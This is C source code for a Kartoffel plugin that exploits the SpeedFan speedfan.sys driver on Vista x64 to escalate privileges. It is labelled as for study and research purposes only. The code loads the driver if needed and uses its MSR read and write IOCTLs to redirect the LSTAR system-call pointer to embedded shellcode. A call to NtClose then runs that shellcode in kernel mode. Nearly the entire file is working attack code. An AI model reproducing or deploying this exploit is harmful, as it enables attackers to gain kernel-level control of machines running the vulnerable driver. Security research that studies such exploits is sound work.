//////////////////////////////////////////////////////////////////////
/////////										09/29/2007
/////////	==============================================
/////////	  Speedfan speedfan.sys Privilege Escalation
/////////				Vista x64 - Exploit
/////////		For study and/or research purposes ONLY
/////////	==============================================
/////////	+ K-plugin by: 
/////////	  Ruben Santamarta 
/////////	+ References:
/////////	  http://www.reversemode.com
/////////	  http://www.almico.com
/////////
//////////////////////////////////////////////////////////////////////	  
/////////
/////////	 K-Plugin ( exploit ) for Kartoffel (http://kartoffel.reversemode.com)
/////////	 > Kartoffel -D speedfan_plugin
/////////
//////////////////////////////////////////////////////////////////////


#include "stdafx.h"




#define IOCTL_RDMSR 0x9C402438
#define IOCTL_WRMSR 0x9C40243C

typedef NTSTATUS (WINAPI *NTCLOSE)(IN HANDLE);


BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
    return TRUE;
}

int Callback_Overview()
{
	printf("\n");
	printf("==============================================\n");
	printf("  Speedfan speedfan.sys Privilege Escalation\n");
	printf("    For study and/or research purposes ONLY\n");
	printf("==============================================\n");
	printf("  Ruben Santamarta\n\n");
	printf("+ References:\n");
	printf("  http://www.reversemode.com\n");
	printf("  http://www.almico.com (speedfan)\n\n");
	return 1;
}


 int Callback_Direct( char *lpInitStr )
{
	KARTO_DIRS	kDirs;
	WCHAR		**lpDevices = NULL;
	LPVOID		lpShellCode=NULL;
	HANDLE		hDevice,hSdevice;
	HMODULE		hNtdll;
	NTCLOSE		_NtClose;
	char		szKdriver[MAX_PATH];
	DWORD		lpoutBuff[1]={0}, lpinBuff[2]={0}; 
	DWORD		junk;
	DWORD		LstarHigh = NULL;
	DWORD		LstarLow  = NULL;
	int			status=TRUE;

	unsigned char ShellCode[]="\x51\x41\x53\xB8\x90\x90\x90\x90"
							  "\xBA\x90\x90\x90\x90\xB9\x82\x00"
							  "\x00\xC0\x0F\x30\x0F\x01\xF8\x90"
							  "\x90\x90\x90\x90\x90\x90\x90\x41"
							  "\x5B\x59\x0F\x01\xF8\x48\x0F\x07";


	Callback_Overview();
	
	hNtdll = GetModuleHandleA("ntdll.dll");
	_NtClose = (NTCLOSE) GetProcAddress(hNtdll,"NtClose");
	printf("\n [+] NtClose [ 0x%p ] \n",_NtClose);

	hSdevice = OpenDevice(L"\\Device\\speedfan",
							TRUE,
							FALSE,
							FALSE,
							0,
							0);

	if (hSdevice == INVALID_HANDLE_VALUE) 
	{
		InitializePaths(&kDirs);
	
		sprintf(szKdriver,
				"%s\\speedfan.sys",
				kDirs.KARTO_PATH);

		printf("\n\n [+] speedfan.sys not found. Loading %s\n\n",szKdriver);

		if( !LoadDriver( szKdriver,"Speedfan") )
		{
			printf("[!] Unable to load speedfan.sys\n");
			return FALSE;
		}
		
		hSdevice = OpenDevice(L"\\Device\\speedfan",
								TRUE,
								FALSE,
								FALSE,
								0,
								0);
		
		if( hSdevice == INVALID_HANDLE_VALUE ) return FALSE;
	}
	

	lpinBuff[0] = 0xC0000082;
	printf("\n [+] Reading LSTAR \n");

	DeviceIoControl(hSdevice,
					IOCTL_RDMSR,
					(LPVOID)lpinBuff,0x4,
					(LPVOID)lpoutBuff,0x8,
					&junk,
					NULL);

	LstarHigh = lpoutBuff[1];
	LstarLow  = lpoutBuff[0];
	
	printf("\n MSR[ LSTAR ]:  nt!KiSystemCall64 [ 0x%X%X ]\n",LstarHigh,LstarLow);
	
	*(DWORD*)(ShellCode+4) = LstarLow;
	*(DWORD*)(ShellCode+9) = LstarHigh;
	
	lpShellCode = VirtualAlloc( NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy( lpShellCode,( void* )ShellCode, sizeof( ShellCode ) );
	
	lpinBuff[0]=0xC0000082;
	lpinBuff[1]=NULL;
	lpinBuff[2]=(DWORD)lpShellCode;

	printf("\n [+] Writing LSTAR \n");
	Sleep(1000);

	SetPriorityClass(GetCurrentProcess(),REALTIME_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_TIME_CRITICAL);
	
	
	DeviceIoControl(hSdevice,
					IOCTL_WRMSR,
					(LPVOID)lpinBuff,0xC,
					(LPVOID)lpoutBuff,0x8,
					&junk,
					NULL);
	
	// Trigggering Shellcode
	_NtClose(hSdevice);

	printf("\n [+] Shellcode executed \n");
	printf("\n [+] Exiting \n");
	
	return status;
}


